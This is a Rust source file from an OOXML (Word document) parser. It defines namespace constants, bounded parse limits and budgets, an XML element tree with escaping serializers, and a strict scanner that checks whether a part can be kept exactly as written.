//! Bounded, resolver-free OOXML event/tree core.

use indexmap::IndexMap;
use quick_xml::Reader;
use quick_xml::events::{BytesStart, Event};
use thiserror::Error;

/// Maximum block and inline nesting depth.
pub const MAX_NESTING_DEPTH: usize = 64;

/// OOXML namespace URIs.
pub mod namespaces {
    pub const W: &str = "http://schemas.openxmlformats.org/wordprocessingml/2006/main";
    pub const A: &str = "http://schemas.openxmlformats.org/drawingml/2006/main";
    pub const R: &str = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
    pub const WP: &str = "http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing";
    pub const WP14: &str = "http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing";
    pub const WPS: &str = "http://schemas.microsoft.com/office/word/2010/wordprocessingShape";
    pub const WPC: &str = "http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas";
    pub const WPG: &str = "http://schemas.microsoft.com/office/word/2010/wordprocessingGroup";
    pub const PIC: &str = "http://schemas.openxmlformats.org/drawingml/2006/picture";
    pub const M: &str = "http://schemas.openxmlformats.org/officeDocument/2006/math";
    pub const MC: &str = "http://schemas.openxmlformats.org/markup-compatibility/2006";
    pub const V: &str = "urn:schemas-microsoft-com:vml";
    pub const O: &str = "urn:schemas-microsoft-com:office:office";
    pub const W14: &str = "http://schemas.microsoft.com/office/word/2010/wordml";
    pub const W15: &str = "http://schemas.microsoft.com/office/word/2012/wordml";
    pub const CT: &str = "http://schemas.openxmlformats.org/package/2006/content-types";
    pub const PR: &str = "http://schemas.openxmlformats.org/package/2006/relationships";
}

/// Conservative defaults for the XML/relationship foundation.
#[derive(Clone, Debug)]
pub struct ParseLimits {
    pub max_xml_bytes: usize,
    pub max_xml_events: usize,
    pub max_xml_text_bytes: usize,
    pub max_xml_depth: usize,
    pub max_attributes_per_element: usize,
    pub max_attribute_bytes: usize,
    pub max_relationships: usize,
    pub max_leaf_values: usize,
    pub max_blocks: usize,
    pub max_paragraphs: usize,
    pub max_tables: usize,
    pub max_table_rows: usize,
    pub max_table_cells: usize,
    pub max_notes: usize,
    pub max_comments: usize,
    pub max_nesting_depth: usize,
}

impl Default for ParseLimits {
    fn default() -> Self {
        Self {
            max_xml_bytes: 128 * 1024 * 1024,
            max_xml_events: 4_000_000,
            max_xml_text_bytes: 128 * 1024 * 1024,
            max_xml_depth: 256,
            max_attributes_per_element: 1024,
            max_attribute_bytes: 4 * 1024 * 1024,
            max_relationships: 250_000,
            max_leaf_values: 1_000_000,
            max_blocks: 500_000,
            max_paragraphs: 500_000,
            max_tables: 100_000,
            max_table_rows: 500_000,
            max_table_cells: 2_000_000,
            max_notes: 100_000,
            max_comments: 100_000,
            max_nesting_depth: MAX_NESTING_DEPTH,
        }
    }
}

/// One package-wide budget shared across every XML part.
#[derive(Clone, Debug)]
pub struct ParseBudget<'a> {
    limits: &'a ParseLimits,
    xml_bytes: usize,
    xml_events: usize,
    xml_text_bytes: usize,
    relationships: usize,
    leaf_values: usize,
    blocks: usize,
    paragraphs: usize,
    tables: usize,
    table_rows: usize,
    table_cells: usize,
    notes: usize,
    comments: usize,
    source_ordinals: bool,
    media: Option<&'a crate::media::MediaTable>,
    media_error: Option<String>,
}

impl<'a> ParseBudget<'a> {
    pub fn new(limits: &'a ParseLimits) -> Self {
        Self {
            limits,
            xml_bytes: 0,
            xml_events: 0,
            xml_text_bytes: 0,
            relationships: 0,
            leaf_values: 0,
            blocks: 0,
            paragraphs: 0,
            tables: 0,
            table_rows: 0,
            table_cells: 0,
            notes: 0,
            comments: 0,
            source_ordinals: false,
            media: None,
            media_error: None,
        }
    }

    /// Reads the bytes behind `media:{n}` image sources from `table`.
    pub(crate) fn read_media_from(&mut self, table: &'a crate::media::MediaTable) {
        self.media = Some(table);
    }

    /// The table `media:{n}` image sources name, when parsing with one.
    pub(crate) fn media_table(&self) -> Option<&'a crate::media::MediaTable> {
        self.media
    }

    /// Fails the parse with the first media part that could not be read.
    pub(crate) fn fail_media_read(&mut self, error: String) {
        self.media_error.get_or_insert(error);
    }

    pub(crate) fn media_read_error(&mut self) -> Option<String> {
        self.media_error.take()
    }

    /// Records each parsed paragraph's `w:p` occurrence in its part; see
    /// [`XmlElement::paragraph_ordinal`].
    pub fn record_source_ordinals(&mut self) {
        self.source_ordinals = true;
    }

    pub(crate) fn records_source_ordinals(&self) -> bool {
        self.source_ordinals
    }

    pub(crate) fn charge_xml_bytes(&mut self, amount: usize, part: &str) -> Result<(), ParseError> {
        charge(
            &mut self.xml_bytes,
            amount,
            self.limits.max_xml_bytes,
            "xmlBytes",
            part,
        )
    }

    pub(crate) fn limits(&self) -> &ParseLimits {
        self.limits
    }

    /// XML events charged so far.
    pub(crate) fn xml_events(&self) -> usize {
        self.xml_events
    }

    pub(crate) fn charge_event(&mut self, part: &str) -> Result<(), ParseError> {
        charge(
            &mut self.xml_events,
            1,
            self.limits.max_xml_events,
            "xmlEvents",
            part,
        )
    }

    pub(crate) fn charge_text(&mut self, amount: usize, part: &str) -> Result<(), ParseError> {
        charge(
            &mut self.xml_text_bytes,
            amount,
            self.limits.max_xml_text_bytes,
            "xmlTextBytes",
            part,
        )
    }

    pub(crate) fn charge_relationship(&mut self, part: &str) -> Result<(), ParseError> {
        charge(
            &mut self.relationships,
            1,
            self.limits.max_relationships,
            "relationships",
            part,
        )
    }

    pub fn charge_leaf_value(&mut self, part: &str) -> Result<(), ParseError> {
        charge(
            &mut self.leaf_values,
            1,
            self.limits.max_leaf_values,
            "leafValues",
            part,
        )
    }

    /// Charge one block before allocating its model node.
    pub fn charge_block(&mut self, part: &str) -> Result<(), ParseError> {
        charge(&mut self.blocks, 1, self.limits.max_blocks, "blocks", part)
    }

    /// Charge one paragraph before parsing its inline subtree.
    pub fn charge_paragraph(&mut self, part: &str) -> Result<(), ParseError> {
        charge(
            &mut self.paragraphs,
            1,
            self.limits.max_paragraphs,
            "paragraphs",
            part,
        )
    }

    /// Charge one table before parsing its grid and rows.
    pub fn charge_table(&mut self, part: &str) -> Result<(), ParseError> {
        charge(&mut self.tables, 1, self.limits.max_tables, "tables", part)
    }

    /// Charge one table row before allocating its model node.
    pub fn charge_table_row(&mut self, part: &str) -> Result<(), ParseError> {
        charge(
            &mut self.table_rows,
            1,
            self.limits.max_table_rows,
            "tableRows",
            part,
        )
    }

    /// Charge one table cell before descending into its story.
    pub fn charge_table_cell(&mut self, part: &str) -> Result<(), ParseError> {
        charge(
            &mut self.table_cells,
            1,
            self.limits.max_table_cells,
            "tableCells",
            part,
        )
    }

    /// Charge one footnote/endnote before allocating its story model.
    pub fn charge_note(&mut self, part: &str) -> Result<(), ParseError> {
        charge(&mut self.notes, 1, self.limits.max_notes, "notes", part)
    }

    /// Charge one comment before allocating its metadata and story model.
    pub fn charge_comment(&mut self, part: &str) -> Result<(), ParseError> {
        charge(
            &mut self.comments,
            1,
            self.limits.max_comments,
            "comments",
            part,
        )
    }

    /// Check the shared story/container depth before descending.
    pub fn check_nesting_depth(&self, depth: usize, part: &str) -> Result<(), ParseError> {
        if depth > self.limits.max_nesting_depth {
            return Err(ParseError::ResourceLimit {
                kind: "nestingDepth",
                part: part.to_owned(),
            });
        }
        Ok(())
    }
}

fn charge(
    used: &mut usize,
    amount: usize,
    limit: usize,
    kind: &'static str,
    part: &str,
) -> Result<(), ParseError> {
    let next = used
        .checked_add(amount)
        .ok_or_else(|| ParseError::ResourceLimit {
            kind,
            part: part.to_owned(),
        })?;
    if next > limit {
        return Err(ParseError::ResourceLimit {
            kind,
            part: part.to_owned(),
        });
    }
    *used = next;
    Ok(())
}

#[derive(Debug, Error, PartialEq, Eq)]
pub enum ParseError {
    #[error("container error: {0}")]
    Container(String),
    #[error("unsafe XML in {part}: {kind}")]
    UnsafeXml { kind: &'static str, part: String },
    #[error("resource limit {kind} exceeded in {part}")]
    ResourceLimit { kind: &'static str, part: String },
    #[error("malformed XML in {part} at byte {offset}: {message}")]
    MalformedXml {
        part: String,
        offset: u64,
        message: String,
    },
    #[error("invalid relationship in {part}: {message}")]
    Relationship { part: String, message: String },
    #[error("canonical encoding failed: {0}")]
    Canonical(String),
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct XmlDocument {
    pub roots: Vec<XmlElement>,
}

impl XmlDocument {
    pub fn root(&self) -> Option<&XmlElement> {
        self.roots.first()
    }
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum XmlNode {
    Element(XmlElement),
    Text(String),
    CData(String),
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct XmlElement {
    pub name: String,
    pub attributes: IndexMap<String, String>,
    pub children: Vec<XmlNode>,
    /// For a `w:p` element, its zero-based index among the part's `w:p`
    /// elements in document order.
    pub paragraph_ordinal: Option<u32>,
    /// For a `w:p` element, the name of its attribute that resolves to the
    /// Word 2010 `paraId` under the namespace bindings in scope; see
    /// [`crate::paragraph_identity::word_para_id_name`].
    pub para_id_attribute: Option<String>,
}

#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct ParsedColor {
    pub value: Option<String>,
    pub theme_color: Option<String>,
    pub theme_tint: Option<String>,
    pub theme_shade: Option<String>,
}

impl XmlElement {
    pub fn local_name(&self) -> &str {
        local_name(&self.name)
    }

    pub fn namespace_prefix(&self) -> Option<&str> {
        namespace_prefix(&self.name)
    }

    pub fn matches_name(&self, namespace: &str, local: &str) -> bool {
        self.name
            .strip_prefix(namespace)
            .and_then(|rest| rest.strip_prefix(':'))
            == Some(local)
            || self.local_name() == local
    }

    pub fn child(&self, namespace: &str, local: &str) -> Option<&XmlElement> {
        self.child_elements()
            .find(|child| child.matches_name(namespace, local))
    }

    pub fn children_named<'a>(
        &'a self,
        namespace: &'a str,
        local: &'a str,
    ) -> impl Iterator<Item = &'a XmlElement> + 'a {
        self.child_elements()
            .filter(move |child| child.matches_name(namespace, local))
    }

    pub fn child_by_local_name(&self, local: &str) -> Option<&XmlElement> {
        self.child_elements()
            .find(|child| child.local_name() == local)
    }

    pub fn children_by_local_name<'a>(
        &'a self,
        local: &'a str,
    ) -> impl Iterator<Item = &'a XmlElement> + 'a {
        self.child_elements()
            .filter(move |child| child.local_name() == local)
    }

    pub fn child_by_full_name(&self, full_name: &str) -> Option<&XmlElement> {
        self.child_elements().find(|child| child.name == full_name)
    }

    pub fn child_elements(&self) -> impl Iterator<Item = &XmlElement> {
        self.children.iter().filter_map(|node| match node {
            XmlNode::Element(element) => Some(element),
            XmlNode::Text(_) | XmlNode::CData(_) => None,
        })
    }

    pub fn attribute(&self, namespace: Option<&str>, name: &str) -> Option<&str> {
        namespace
            .and_then(|namespace| {
                self.attributes.iter().find_map(|(key, value)| {
                    key.strip_prefix(namespace)
                        .and_then(|rest| rest.strip_prefix(':'))
                        .filter(|local| *local == name)
                        .map(|_| value.as_str())
                })
            })
            .or_else(|| self.attributes.get(name).map(String::as_str))
    }

    pub fn attribute_any<'a>(&'a self, names: &[&str]) -> Option<&'a str> {
        names
            .iter()
            .find_map(|name| self.attributes.get(*name).map(String::as_str))
    }

    pub fn text_content(&self) -> String {
        let mut text = String::new();
        self.append_text(&mut text);
        text
    }

    fn append_text(&self, output: &mut String) {
        for child in &self.children {
            match child {
                XmlNode::Text(text) | XmlNode::CData(text) => output.push_str(text),
                XmlNode::Element(element) => element.append_text(output),
            }
        }
    }

    pub fn has_flag(&self, namespace: Option<&str>, name: &str) -> bool {
        !matches!(
            self.attribute(namespace, name),
            None | Some("0" | "false" | "off")
        )
    }

    pub fn has_child(&self, namespace: &str, local: &str) -> bool {
        self.child(namespace, local).is_some()
    }

    pub fn parse_color(&self) -> ParsedColor {
        ParsedColor {
            value: self.attribute(Some("w"), "val").map(str::to_owned),
            theme_color: self.attribute(Some("w"), "themeColor").map(str::to_owned),
            theme_tint: self.attribute(Some("w"), "themeTint").map(str::to_owned),
            theme_shade: self.attribute(Some("w"), "themeShade").map(str::to_owned),
        }
    }

    pub fn parse_numeric_attribute(
        &self,
        namespace: Option<&str>,
        name: &str,
        scale: f64,
    ) -> Option<f64> {
        parse_javascript_integer_prefix(self.attribute(namespace, name)?).map(|value| value * scale)
    }

    pub fn parse_boolean(&self, namespace: &str) -> bool {
        !matches!(
            self.attribute(Some(namespace), "val"),
            Some("0" | "false" | "off")
        )
    }

    pub fn find_deep(&self, namespace: &str, local: &str) -> Option<&XmlElement> {
        if self.matches_name(namespace, local) {
            return Some(self);
        }
        self.child_elements()
            .find_map(|child| child.find_deep(namespace, local))
    }

    pub fn find_all_deep<'a>(
        &'a self,
        namespace: &str,
        local: &str,
        output: &mut Vec<&'a XmlElement>,
    ) {
        if self.matches_name(namespace, local) {
            output.push(self);
        }
        for child in self.child_elements() {
            child.find_all_deep(namespace, local, output);
        }
    }

    /// Structural XML serialization with text/attribute escaping by construction.
    pub fn to_xml(&self) -> String {
        let mut output = String::new();
        self.write_xml(&mut output);
        output
    }

    /// Serializes raw inline XML, escaping only double quotes in attributes.
    /// The occurrence of the first `w:p` in this subtree; see [`Self::paragraph_ordinal`].
    pub fn first_paragraph_ordinal(&self) -> Option<u32> {
        self.paragraph_ordinal.or_else(|| {
            self.child_elements()
                .find_map(Self::first_paragraph_ordinal)
        })
    }

    pub fn to_raw_inline_xml(&self) -> String {
        let mut output = String::new();
        self.write_raw_inline_xml(&mut output);
        output
    }

    fn write_xml(&self, output: &mut String) {
        output.push('<');
        output.push_str(&self.name);
        for (name, value) in &self.attributes {
            output.push(' ');
            output.push_str(name);
            output.push_str("=\"");
            escape_attribute(value, output);
            output.push('"');
        }
        if self.children.is_empty() {
            output.push_str("/>");
            return;
        }
        output.push('>');
        for child in &self.children {
            match child {
                XmlNode::Element(element) => element.write_xml(output),
                XmlNode::Text(text) => escape_text(text, output),
                XmlNode::CData(text) => {
                    // Re-emit CDATA safely even when its payload contains the terminator.
                    output.push_str("<![CDATA[");
                    output.push_str(&text.replace("]]>", "]]]]><![CDATA[>"));
                    output.push_str("]]>");
                }
            }
        }
        output.push_str("</");
        output.push_str(&self.name);
        output.push('>');
    }

    fn write_raw_inline_xml(&self, output: &mut String) {
        output.push('<');
        output.push_str(&self.name);
        for (name, value) in &self.attributes {
            output.push(' ');
            output.push_str(name);
            output.push_str("=\"");
            for character in value.chars() {
                match character {
                    '&' => output.push_str("&amp;"),
                    '<' => output.push_str("&lt;"),
                    '>' => output.push_str("&gt;"),
                    '"' => output.push_str("&quot;"),
                    _ => output.push(character),
                }
            }
            output.push('"');
        }
        if self.children.is_empty() {
            output.push_str("/>");
            return;
        }
        output.push('>');
        for child in &self.children {
            match child {
                XmlNode::Element(element) => element.write_raw_inline_xml(output),
                XmlNode::Text(text) => escape_text(text, output),
                XmlNode::CData(text) => {
                    output.push_str("<![CDATA[");
                    output.push_str(&text.replace("]]>", "]]]]><![CDATA[>"));
                    output.push_str("]]>");
                }
            }
        }
        output.push_str("</");
        output.push_str(&self.name);
        output.push('>');
    }
}

/// Parse one XML part without a DTD/entity resolver and under a shared budget.
pub fn parse_xml(
    xml: &[u8],
    part: &str,
    budget: &mut ParseBudget<'_>,
) -> Result<XmlDocument, ParseError> {
    parse_xml_strict(repaired(xml).as_ref(), part, budget)
}

/// `xml` as [`parse_xml`] reads it: borrowed unless the part needed repair.
fn repaired(xml: &[u8]) -> std::borrow::Cow<'_, [u8]> {
    escape_stray_ampersands(xml)
}

/// Whether a splice may keep `xml`'s bytes verbatim: [`parse_xml`] reads it without repair, and
/// it is UTF-8 holding only the plain XML below, a subset of XML 1.0 (Fifth Edition) with
/// Namespaces in XML 1.0 (Third Edition). Any other part is written whole.
///
/// ```text
/// part        ::= BOM? XMLDecl? S? element S?
/// XMLDecl     ::= '<?xml' S 'version' Eq Q('1.0') (S 'encoding' Eq Q('UTF-8'))?
///                 (S 'standalone' Eq Q('yes' | 'no'))? S? '?>'
/// element     ::= '<' QName (S Attribute)* S? ('/>' | '>' content '</' QName S? '>')
/// Attribute   ::= QName Eq ('"' ((Char - [<&"]) | Reference)* '"'
///                         | "'" ((Char - [<&']) | Reference)* "'")
/// content     ::= ((Char - [<&]) | Reference | element)*
/// Reference   ::= '&' ('amp' | 'lt' | 'gt' | 'quot' | 'apos') ';'
///               | '&#' [0-9]+ ';' | '&#x' [0-9a-fA-F]+ ';'
/// QName       ::= NCName (':' NCName)?
/// NCName      ::= [A-Za-z_] [A-Za-z0-9._-]*
/// Eq          ::= S? '=' S?
/// S           ::= (#x20 | #x9 | #xD | #xA)+
/// Char        ::= #x9 | #xA | #xD | [#x20-#xD7FF] | [#xE000-#xFFFD] | [#x10000-#x10FFFF]
/// ```
///
/// `Q(v)` is `v` in single or double quotes, `UTF-8` in any case. Character data holds no `]]>`,
/// a character reference names a `Char` in at most 12 bytes, and an end tag's name is its start
/// tag's. So there are no comments, processing instructions, CDATA sections or document type
/// declarations. Namespaces: every element and attribute prefix is bound (`xml` implicitly), no
/// element has the `xmlns` prefix, attributes are unique by expanded name, a prefixed declaration
/// is non-empty, `xmlns` is never declared, `xml` only to its own namespace, and no other prefix or
/// default to the `xml` or `xmlns` namespace; declaration values hold no reference or whitespace.
///
/// The loader names elements and attributes by their written prefix and local name, so a part
/// is also refused where that reading and a namespace-aware one could differ: a standard prefix
/// bound to another namespace or a standard namespace under another prefix, an element of another
/// namespace inside a `w` element, and an unprefixed attribute on a WordprocessingML element. It is
/// refused too where a `w:t`, `w:delText`, `w:instrText`, `w:delInstrText` or `m:t` holds an
/// element or, without `xml:space="preserve"` in scope, a leading or trailing space, and where
/// other text that is not only whitespace between tags holds a carriage return. Other whitespace
/// (tabs, line breaks and inner runs of spaces in text, attribute-value normalization) is left as
/// written: kept bytes read in Word as they did before the save.
pub fn reads_as_written(xml: &[u8]) -> bool {
    matches!(repaired(xml), std::borrow::Cow::Borrowed(_)) && PlainXml::new(xml).accepts()
}

/// Prefixes the loader reads by name, with the namespaces they stand for.
const STANDARD_NAMESPACES: [(&str, &str); 22] = [
    ("w", namespaces::W),
    ("v", namespaces::V),
    ("o", namespaces::O),
    ("a", namespaces::A),
    ("r", namespaces::R),
    ("wp", namespaces::WP),
    ("wp14", namespaces::WP14),
    ("wps", namespaces::WPS),
    ("wpc", namespaces::WPC),
    ("wpg", namespaces::WPG),
    ("pic", namespaces::PIC),
    ("m", namespaces::M),
    ("mc", namespaces::MC),
    ("w14", namespaces::W14),
    ("w15", namespaces::W15),
    ("w10", "urn:schemas-microsoft-com:office:word"),
    (
        "w16se",
        "http://schemas.microsoft.com/office/word/2015/wordml/symex",
    ),
    (
        "w16cid",
        "http://schemas.microsoft.com/office/word/2016/wordml/cid",
    ),
    (
        "w16",
        "http://schemas.microsoft.com/office/word/2018/wordml",
    ),
    (
        "w16cex",
        "http://schemas.microsoft.com/office/word/2018/wordml/cex",
    ),
    (
        "w16sdtdh",
        "http://schemas.microsoft.com/office/word/2020/wordml/sdtdatahash",
    ),
    (
        "wne",
        "http://schemas.microsoft.com/office/word/2006/wordml",
    ),
];

/// WordprocessingML prefixes, whose attributes are always prefixed.
const WORD_PREFIXES: [&[u8]; 9] = [
    b"w",
    b"w14",
    b"w15",
    b"w16se",
    b"w16cid",
    b"w16",
    b"w16cex",
    b"w16sdtdh",
    b"wne",
];

const XML_NAMESPACE: &[u8] = b"http://www.w3.org/XML/1998/namespace";
const XMLNS_NAMESPACE: &[u8] = b"http://www.w3.org/2000/xmlns/";
const UNPREFIXED: &[u8] = b"";

/// A part's attribute: its prefix (empty when unprefixed), local name and raw value.
type PlainAttribute<'a> = (&'a [u8], &'a [u8], &'a [u8]);

/// An element [`PlainXml`] has read the start tag of.
struct OpenElement<'a> {
    name: &'a [u8],
    prefix: &'a [u8],
    /// The length of `bindings` before its start tag.
    mark: usize,
    /// Whether `xml:space="preserve"` is in scope.
    preserve: bool,
    /// For a text element, where its content starts.
    text: Option<usize>,
}

/// The scanner behind [`reads_as_written`].
struct PlainXml<'a> {
    xml: &'a [u8],
    at: usize,
    open: Vec<OpenElement<'a>>,
    /// In-scope prefix bindings, innermost last; the default namespace has the empty prefix.
    bindings: Vec<(&'a [u8], &'a [u8])>,
    attributes: Vec<PlainAttribute<'a>>,
    names: Vec<(&'a [u8], &'a [u8])>,
}

impl<'a> PlainXml<'a> {
    fn new(xml: &'a [u8]) -> Self {
        Self {
            xml,
            at: 0,
            open: Vec::new(),
            bindings: Vec::new(),
            attributes: Vec::new(),
            names: Vec::new(),
        }
    }

    fn accepts(mut self) -> bool {
        let xml = self.xml;
        if std::str::from_utf8(xml).is_err()
            || xml.iter().enumerate().any(|(index, &byte)| {
                (byte < 0x20 && !matches!(byte, b'\t' | b'\n' | b'\r'))
                    || (byte == 0xEF
                        && xml.get(index + 1) == Some(&0xBF)
                        && matches!(xml.get(index + 2), Some(0xBE | 0xBF)))
            })
        {
            return false;
        }
        self.eat(b"\xEF\xBB\xBF");
        if xml[self.at..].starts_with(b"<?xml") && !self.declaration() {
            return false;
        }
        let mut roots = 0usize;
        loop {
            let start = self.at;
            while !matches!(xml.get(self.at), None | Some(b'<' | b'&')) {
                self.at += 1;
            }
            let run = &xml[start..self.at];
            if self.open.is_empty() {
                if !run.iter().all(is_xml_space) {
                    return false;
                }
            } else if run.windows(3).any(|window| window == b"]]>")
                || (run.contains(&b'\r')
                    && self.open.last().is_some_and(|open| open.text.is_none())
                    && !(run.iter().all(is_xml_space)
                        && xml.get(self.at) == Some(&b'<')
                        && xml[..start].last() == Some(&b'>')))
            {
                return false;
            }
            match xml.get(self.at) {
                None => return self.open.is_empty() && roots == 1,
                Some(b'&') => {
                    if self.open.is_empty() || !self.reference() {
                        return false;
                    }
                }
                Some(_) => {
                    self.at += 1;
                    let accepted = if self.eat(b"/") {
                        self.end_tag()
                    } else {
                        if self.open.is_empty() {
                            roots += 1;
                        }
                        roots == 1 && self.start_tag()
                    };
                    if !accepted {
                        return false;
                    }
                }
            }
        }
    }

    fn declaration(&mut self) -> bool {
        self.at += b"<?xml".len();
        if !(self.space()
            && self.eat(b"version")
            && self.eq()
            && self.quoted(|value| value == b"1.0"))
        {
            return false;
        }
        let mut spaced = self.space();
        if spaced && self.eat(b"encoding") {
            if !(self.eq() && self.quoted(|value| value.eq_ignore_ascii_case(b"utf-8"))) {
                return false;
            }
            spaced = self.space();
        }
        if spaced && self.eat(b"standalone") {
            if !(self.eq() && self.quoted(|value| value == b"yes" || value == b"no")) {
                return false;
            }
            self.space();
        }
        self.eat(b"?>")
    }

    fn start_tag(&mut self) -> bool {
        let Some((name, prefix, local)) = self.qname() else {
            return false;
        };
        let mark = self.bindings.len();
        let mut attributes = std::mem::take(&mut self.attributes);
        attributes.clear();
        let empty = loop {
            let spaced = self.space();
            if self.eat(b">") {
                break false;
            }
            if self.eat(b"/>") {
                break true;
            }
            let Some((_, key_prefix, key_local)) = self.qname().filter(|_| spaced) else {
                return false;
            };
            if !self.eq() {
                return false;
            }
            let Some(value) = self.attribute_value() else {
                return false;
            };
            attributes.push((key_prefix, key_local, value));
        };
        let parent = self.open.last();
        let mut preserve = parent.is_some_and(|parent| parent.preserve);
        for &(key_prefix, key_local, value) in &attributes {
            if (key_prefix, key_local) == (b"xml", b"space") {
                preserve = value == b"preserve";
            }
            let declared = match (key_prefix, key_local) {
                (b"xmlns", b"xmlns") => return false,
                (b"xmlns", local) => {
                    if value.is_empty() || (local == b"xml") != (value == XML_NAMESPACE) {
                        return false;
                    }
                    local
                }
                (b"", b"xmlns") => {
                    if value == XML_NAMESPACE {
                        return false;
                    }
                    UNPREFIXED
                }
                _ => continue,
            };
            if value == XMLNS_NAMESPACE
                || value
                    .iter()
                    .any(|&byte| byte == b'&' || is_xml_space(&byte))
                || STANDARD_NAMESPACES.iter().any(|(standard, namespace)| {
                    (standard.as_bytes() == declared) != (namespace.as_bytes() == value)
                })
            {
                return false;
            }
            self.bindings.push((declared, value));
        }
        if prefix == b"xmlns"
            || (!prefix.is_empty() && self.resolve(prefix).is_none())
            || parent.is_some_and(|parent| {
                parent.text.is_some()
                    || (parent.prefix == b"w"
                        && !STANDARD_NAMESPACES
                            .iter()
                            .any(|(standard, _)| standard.as_bytes() == prefix))
            })
            || (WORD_PREFIXES.contains(&prefix)
                && attributes.iter().any(|&(key_prefix, key_local, _)| {
                    key_prefix.is_empty() && key_local != b"xmlns"
                }))
        {
            return false;
        }
        let mut names = std::mem::take(&mut self.names);
        names.clear();
        for &(key_prefix, key_local, _) in &attributes {
            let namespace = match (key_prefix, key_local) {
                (b"xmlns", _) | (b"", b"xmlns") => XMLNS_NAMESPACE,
                (b"", _) => UNPREFIXED,
                _ => match self.resolve(key_prefix) {
                    Some(namespace) => namespace,
                    None => return false,
                },
            };
            let local = if key_prefix.is_empty() && key_local == b"xmlns" {
                UNPREFIXED
            } else {
                key_local
            };
            names.push((namespace, local));
        }
        names.sort_unstable();
        let unique = names.windows(2).all(|pair| pair[0] != pair[1]);
        self.attributes = attributes;
        self.names = names;
        if !unique {
            return false;
        }
        if empty {
            self.bindings.truncate(mark);
        } else {
            let text = ((prefix == b"w"
                && matches!(local, b"t" | b"delText" | b"instrText" | b"delInstrText"))
                || (prefix == b"m" && local == b"t"))
                .then_some(self.at);
            self.open.push(OpenElement {
                name,
                prefix,
                mark,
                preserve,
                text,
            });
        }
        true
    }

    fn end_tag(&mut self) -> bool {
        let close = self.at - 2;
        let Some((name, _, _)) = self.qname() else {
            return false;
        };
        self.space();
        let Some(open) = self.open.pop() else {
            return false;
        };
        self.bindings.truncate(open.mark);
        open.name == name
            && self.eat(b">")
            && open
                .text
                .is_none_or(|start| self.text_reads_as_written(start, close, open.preserve))
    }

    /// Whether the text content `xml[start..end]` starts and ends with something other than a
    /// space, written or referenced, unless `preserve`.
    fn text_reads_as_written(&self, start: usize, end: usize, preserve: bool) -> bool {
        let content = &self.xml[start..end];
        let space = |reference: &[u8]| {
            let value = match reference {
                [b'&', b'#', b'x', digits @ .., b';'] => std::str::from_utf8(digits)
                    .ok()
                    .and_then(|digits| u32::from_str_radix(digits, 16).ok()),
                [b'&', b'#', digits @ .., b';'] => std::str::from_utf8(digits)
                    .ok()
                    .and_then(|digits| digits.parse().ok()),
                _ => None,
            };
            value == Some(u32::from(b' '))
        };
        let first = match content.first() {
            Some(b'&') => content
                .iter()
                .position(|&byte| byte == b';')
                .is_some_and(|end| space(&content[..=end])),
            first => first == Some(&b' '),
        };
        let last = match content.last() {
            Some(b';') => content
                .iter()
                .rposition(|&byte| byte == b'&')
                .is_some_and(|start| space(&content[start..])),
            last => last == Some(&b' '),
        };
        preserve || !(first || last)
    }

    fn resolve(&self, prefix: &[u8]) -> Option<&'a [u8]> {
        if prefix == b"xml" {
            return Some(XML_NAMESPACE);
        }
        self.bindings
            .iter()
            .rev()
            .find(|(bound, _)| *bound == prefix)
            .map(|(_, namespace)| *namespace)
    }

    fn attribute_value(&mut self) -> Option<&'a [u8]> {
        let quote = *self
            .xml
            .get(self.at)
            .filter(|&&byte| byte == b'"' || byte == b'\'')?;
        self.at += 1;
        let start = self.at;
        loop {
            match *self.xml.get(self.at)? {
                byte if byte == quote => {
                    self.at += 1;
                    let xml = self.xml;
                    return Some(&xml[start..self.at - 1]);
                }
                b'<' => return None,
                b'&' => {
                    if !self.reference() {
                        return None;
                    }
                }
                _ => self.at += 1,
            }
        }
    }

    fn reference(&mut self) -> bool {
        let rest = &self.xml[self.at..];
        let Some(end) = rest.iter().take(12).position(|&byte| byte == b';') else {
            return false;
        };
        self.at += end + 1;
        let number = |digits: &[u8], radix: u32| {
            !digits.is_empty()
                && std::str::from_utf8(digits)
                    .ok()
                    .filter(|digits| digits.bytes().all(|byte| byte.is_ascii_hexdigit()))
                    .and_then(|digits| u32::from_str_radix(digits, radix).ok())
                    .and_then(char::from_u32)
                    .is_some_and(is_legal_xml_character)
        };
        match &rest[1..end] {
            b"amp" | b"lt" | b"gt" | b"quot" | b"apos" => true,
            [b'#', b'x', digits @ ..] => number(digits, 16),
            [b'#', digits @ ..] => digits.iter().all(u8::is_ascii_digit) && number(digits, 10),
            _ => false,
        }
    }

    /// A QName as (whole name, prefix, local name), the prefix empty when unprefixed.
    fn qname(&mut self) -> Option<(&'a [u8], &'a [u8], &'a [u8])> {
        let start = self.at;
        let first = self.ncname()?;
        if !self.eat(b":") {
            return Some((first, UNPREFIXED, first));
        }
        let local = self.ncname()?;
        let xml = self.xml;
        Some((&xml[start..self.at], first, local))
    }

    fn ncname(&mut self) -> Option<&'a [u8]> {
        let start = self.at;
        if !matches!(self.xml.get(self.at), Some(byte) if byte.is_ascii_alphabetic() || *byte == b'_')
        {
            return None;
        }
        self.at += 1;
        while matches!(self.xml.get(self.at), Some(byte) if byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'-' | b'_'))
        {
            self.at += 1;
        }
        let xml = self.xml;
        Some(&xml[start..self.at])
    }

    fn quoted(&mut self, valid: impl Fn(&[u8]) -> bool) -> bool {
        let Some(&quote) = self
            .xml
            .get(self.at)
            .filter(|&&byte| byte == b'"' || byte == b'\'')
        else {
            return false;
        };
        let start = self.at + 1;
        let Some(length) = self.xml[start..].iter().position(|&byte| byte == quote) else {
            return false;
        };
        self.at = start + length + 1;
        valid(&self.xml[start..start + length])
    }

    fn eq(&mut self) -> bool {
        self.space();
        let equals = self.eat(b"=");
        self.space();
        equals
    }

    fn space(&mut self) -> bool {
        let start = self.at;
        while self.xml.get(self.at).is_some_and(is_xml_space) {
            self.at += 1;
        }
        self.at > start
    }

    fn eat(&mut self, token: &[u8]) -> bool {
        let found = self.xml[self.at..].starts_with(token);
        if found {
            self.at += token.len();
        }
        found
    }
}

fn is_xml_space(byte: &u8) -> bool {
    matches!(byte, b' ' | b'\t' | b'\r' | b'\n')
}

/// Parse emitted XML without repairing malformed entity references.
